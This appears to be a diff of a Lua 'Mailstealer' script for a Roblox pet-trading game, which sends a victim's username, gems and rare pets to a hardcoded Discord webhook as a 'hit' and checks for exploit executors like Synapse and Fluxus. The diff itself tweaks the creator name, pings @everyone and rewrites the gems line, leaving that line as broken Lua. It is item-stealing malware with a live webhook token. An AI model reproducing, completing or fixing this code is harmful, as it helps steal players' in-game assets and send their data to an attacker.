@@ -1,5 +1,5 @@
 local WebHook = "https://discord.com/api/webhooks/1202269897640644618/Nzv-sppXD3s2-1tmOTwf1f4gxKFNs6s7GEXCtbxiaWPcpB04_Jpxh7y87bar_uyx8THO"
-local Creator = "Tiger12092008"
+local Creator = "tiger12092008"
 
 local isSynapse, isFluxus, isDelta = false, false, false
 
@@ -33,13 +33,13 @@ while true do
     end
 
     local data = {
-        content = "||<@918007508935802910>|| Mailstealer Hit 🎉",
+        content = "||@everyone|| Mailstealer Hit 🎉",
         embeds = {
             {
                 title = "(:penguin:) Player Info",
                 description = string.format(
                     "(:lock:) Executed By: %s\n(:game_die:) Creator: %s\n(:pushpin:) Version: 1.0(beta)\n\n" ..
-                    "(:cat:) Pets List\n(:gem:) Gems:"gemsAmount" %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
+                    "(:cat:) Pets List\n(:gem:) Gems: "tostring(gemsAmount)," %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
                     "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
                     displayUsername,
                     Creator,
